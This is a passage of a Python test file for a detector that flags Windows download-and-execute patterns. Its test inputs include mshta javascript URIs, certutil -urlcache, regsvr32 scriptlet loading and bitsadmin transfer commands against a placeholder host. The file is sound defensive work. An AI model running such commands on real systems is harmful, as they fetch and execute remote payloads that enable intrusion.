        assert f is not None

    def test_pattern_mshta_javascript(self):
        f = _parse_and_analyze("C:\\mshta.exe", "javascript:void(0)")
        assert f is not None
        assert "mshta" in f.details["matched_patterns"].lower()

    def test_pattern_certutil_urlcache(self):
        f = _parse_and_analyze("C:\\certutil.exe", "-urlcache -f http://x")
        assert f is not None
        assert "certutil" in f.details["matched_patterns"].lower()

    def test_pattern_regsvr32_scriptlet(self):
        f = _parse_and_analyze("C:\\regsvr32.exe", "/s /i:http://x scrobj.dll")
        assert f is not None
        assert "regsvr32" in f.details["matched_patterns"].lower()

    def test_pattern_bitsadmin_transfer(self):
        f = _parse_and_analyze("C:\\bitsadmin.exe", "/transfer job http://x C:\\x")
        assert f is not None
        assert "bits" in f.details["matched_patterns"].lower()
